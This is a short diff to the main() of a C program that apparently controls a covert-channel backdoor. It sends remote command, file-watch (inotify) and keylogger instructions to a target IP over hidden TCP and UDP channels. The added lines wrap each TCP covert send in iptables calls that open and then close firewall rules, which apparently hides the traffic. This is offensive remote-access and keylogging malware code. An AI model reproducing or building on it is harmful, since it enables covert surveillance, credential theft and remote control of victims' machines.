@@ -105,8 +105,10 @@ int main(int argc, char **argv){
 
     //COMMAND
     if(if_command == true && tcp == true) {
+        iptables(targetip, tcp, PORT, false, false);
         covert_send(localip, targetip, UPORT, UPORT, data, COMMAND);
         covert_send(localip, targetip, UPORT, UPORT, data, EOT);
+        iptables(targetip, tcp, PORT, false, true);
     } if(if_command == true && tcp == false) {
         covert_udp_send_data(localip, targetip, UPORT, UPORT, data, COMMAND);   //also sends EOT
 
@@ -116,8 +118,10 @@ int main(int argc, char **argv){
         printf("data: %s\n", data);
 
         if(tcp == true) {
+            iptables(targetip, tcp, PORT, false, false);
             covert_send(localip, targetip, UPORT, UPORT, data, INOTIFY);
             covert_send(localip, targetip, UPORT, UPORT, data, EOT);
+            iptables(targetip, tcp, PORT, false, true);
         } else {
             covert_udp_send_data(localip, targetip, UPORT, UPORT, data, INOTIFY);   //also sends EOT
         }
@@ -125,8 +129,10 @@ int main(int argc, char **argv){
     //KEYLOGGER
     } else if (if_keylogger == true && tcp == true) {
         strncpy(data, "k", 1);
+        iptables(targetip, tcp, PORT, false, false);
         covert_send(localip, targetip, UPORT, UPORT, data, KEYLOGGER);
         covert_send(localip, targetip, UPORT, UPORT, data, EOT);
+        iptables(targetip, tcp, PORT, false, true);
     } else if (if_keylogger == true && tcp == false) {
         strncpy(data, "k", 1);
         covert_udp_send_data(localip, targetip, UPORT, UPORT, data, KEYLOGGER); //also sends EOT
